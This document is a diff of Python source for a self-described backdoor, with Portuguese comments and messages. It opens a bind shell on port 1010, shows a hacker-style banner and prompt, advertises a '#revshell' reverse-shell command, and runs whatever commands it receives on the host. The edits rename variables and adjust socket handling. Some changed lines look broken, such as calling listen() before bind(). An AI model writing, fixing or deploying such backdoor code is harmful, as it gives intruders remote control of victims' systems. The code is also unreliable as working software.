@@ -31,7 +31,7 @@ off='\033[0m'
 fgreen='\033[42;97m'
 
 
-_HOST = '0.0.0.0' #o ip
+SERVER_HOST = '0.0.0.0' #o ip
 SERVER_PORT = 1010 #a porta a se conectar
 backdoor_version = "1.0"
 
@@ -175,13 +175,15 @@ else:
 # Cria um objeto socket
 server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
+server_sock.bind((SERVER_HOST, SERVER_PORT))
+
 # Conecta ao cliente e define a variável client_sock como o objeto socket do cliente
 client_sock, address = server_sock.accept()
 
 client_sock.send(b'\033c')
 client_sock.send(f'{banner_reaper}\n'.encode())
 client_sock.send(f'{green}[*]{off} Bem-Vindo\n{green}[+]{off} python versão: {python_version}\n{green}[+]{off} backdoor versão: {backdoor_version}\n{green}[+]{off} Use #help para ver os comandos\n{red}[+]{yellow} Este é um shell de ligação para ter um shell reverso Use o comando {green}#revshell\n{off}'.encode())
-client_sock.send(f'\n[{red}{vusername}{off}@{red}{hostname}{off}]:~# '.encode())
+client_sock.send(f'\n[{red}{username}{off}@{red}{hostname}{off}]:~# '.encode())
 while True:
             cmd = client_sock.recv(1024).decode().strip()
             if cmd == '#revshell':
@@ -206,7 +208,7 @@ while True:
                 break
             output = subprocess.getoutput(cmd)
             client_sock.send(output.encode())
-            client_sock.send(f'\n[{red}{vusername}{off}@{red}{hostname}{off}]:~# '.encode())
+            client_sock.send(f'\n[{red}{username}{off}@{red}{hostname}{off}]:~# '.encode())
 
 else:
          client_sock.send(f'\n[{red}\o/ Wrong Passowrd{off}]\n'.encode())
@@ -216,8 +218,8 @@ def start_server():
     #cria um objeto socket
     server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server_sock.listen(5)
     server_sock.bind((SERVER_HOST, SERVER_PORT))
-    server_sock.listen()
     print(f"{green}[+] A porta do Backdoor foi aberta em {off} {SERVER_PORT}")
     while True:
         client_sock, addr = server_sock.accept()
@@ -226,6 +228,7 @@ def start_server():
         if pid == 0:
             server_sock.close()
             handle_client(client_sock)
+            client_sock.close()
             os._exit(0)
         else:
             client_sock.close()
